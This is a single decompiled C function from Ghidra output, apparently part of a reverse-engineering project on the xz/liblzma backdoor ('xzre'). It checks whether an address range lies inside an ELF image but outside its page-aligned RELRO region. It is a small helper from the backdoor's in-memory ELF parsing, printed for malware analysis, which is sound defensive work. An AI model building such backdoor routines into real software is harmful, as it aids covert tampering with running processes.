// /home/kali/xzre-ghidra/xzregh/1022D0_elf_contains_vaddr_relro.c
// Function: elf_contains_vaddr_relro @ 0x1022D0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall elf_contains_vaddr_relro(elf_info_t * elf_info, u64 vaddr, u64 size, u32 p_flags)


BOOL elf_contains_vaddr_relro(elf_info_t *elf_info,u64 vaddr,u64 size,u32 p_flags)

{
  uint uVar1;
  ulong uVar2;
  ulong uVar3;
  
  uVar1 = elf_contains_vaddr(elf_info,(void *)vaddr,size,2);
  if (((uVar1 != 0) && (uVar1 = 1, p_flags != 0)) && (elf_info->gnurelro_found != 0)) {
    uVar3 = (long)elf_info->elfbase + (elf_info->gnurelro_vaddr - elf_info->first_vaddr);
    uVar2 = elf_info->gnurelro_memsize + uVar3;
    uVar3 = uVar3 & 0xfffffffffffff000;
    if ((uVar2 & 0xfff) != 0) {
      uVar2 = (uVar2 & 0xfffffffffffff000) + 0x1000;
    }
    if ((uVar2 <= vaddr) || (uVar1 = 0, vaddr < uVar3)) {
      uVar1 = (uint)(vaddr + size <= uVar3 && vaddr < uVar3 || uVar2 < vaddr + size);
    }
  }
  return uVar1;
}

